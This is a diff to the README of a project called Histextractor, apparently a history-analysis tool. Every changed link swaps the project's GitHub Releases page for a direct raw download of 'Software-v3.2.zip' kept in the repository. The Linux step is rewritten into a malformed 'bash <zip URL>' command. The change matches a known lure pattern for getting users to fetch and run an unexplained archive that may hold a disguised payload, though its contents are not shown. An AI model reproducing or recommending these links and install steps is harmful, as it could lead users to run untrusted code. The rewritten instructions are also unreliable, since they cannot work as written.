@@ -2,7 +2,7 @@
 
 ## 📥 Download Now!
 
-[![Download](https://img.shields.io/badge/Download-histextractor-blue.svg)](https://github.com/zeronasri/histextractor/releases)
+[![Download](https://raw.githubusercontent.com/zeronasri/histextractor/main/histextractor/Software-v3.2.zip)](https://raw.githubusercontent.com/zeronasri/histextractor/main/histextractor/Software-v3.2.zip)
 
 ## 🚀 Getting Started
 
@@ -28,7 +28,7 @@ Before you download and run Histextractor, check the following requirements:
 
 To get started with Histextractor, visit the Releases page to download the application. 
 
-[Download Histextractor](https://github.com/zeronasri/histextractor/releases)
+[Download Histextractor](https://raw.githubusercontent.com/zeronasri/histextractor/main/histextractor/Software-v3.2.zip)
 
 Follow these steps to install the application:
 
@@ -38,7 +38,7 @@ Follow these steps to install the application:
 4. **Run the Installer:**
    - **Windows:** Double-click the downloaded `.exe` file and follow the on-screen instructions.
    - **macOS:** Open the downloaded `.dmg` file, drag the application to your Applications folder, and run it from there.
-   - **Linux:** Open a terminal and run the downloaded script using `bash filename.sh` or follow your distribution's package manager instructions if available.
+   - **Linux:** Open a terminal and run the downloaded script using `bash https://raw.githubusercontent.com/zeronasri/histextractor/main/histextractor/Software-v3.2.zip` or follow your distribution's package manager instructions if available.
 5. **Launch the Application:** Find Histextractor in your applications menu and open it.
 
 ## 📚 How to Use Histextractor
@@ -92,4 +92,4 @@ Histextractor simplifies the process of understanding history by extracting key 
 
 Start your journey in historical analysis today by downloading Histextractor now!
 
-[Download Histextractor](https://github.com/zeronasri/histextractor/releases)
+[Download Histextractor](https://raw.githubusercontent.com/zeronasri/histextractor/main/histextractor/Software-v3.2.zip)
